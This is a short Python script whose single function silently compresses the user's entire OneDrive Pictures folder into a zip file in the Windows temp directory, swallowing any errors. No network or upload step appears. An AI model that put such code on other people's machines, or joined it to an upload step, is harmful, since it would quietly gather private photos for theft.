import os
import zipfile



def zip():
    user_profile = os.environ['USERPROFILE']
    directory_to_zip = os.path.join(user_profile, "OneDrive", "Pictures")
    output_zip = os.path.join(user_profile, "AppData", "Local", "Temp", "photos.zip")
    os.makedirs(os.path.dirname(output_zip), exist_ok=True)



    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(directory_to_zip):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    try:
                        arcname = os.path.relpath(file_path, directory_to_zip)
                        zipf.write(file_path, arcname)
                    except OSError as e:
                        pass
    return output_zip


    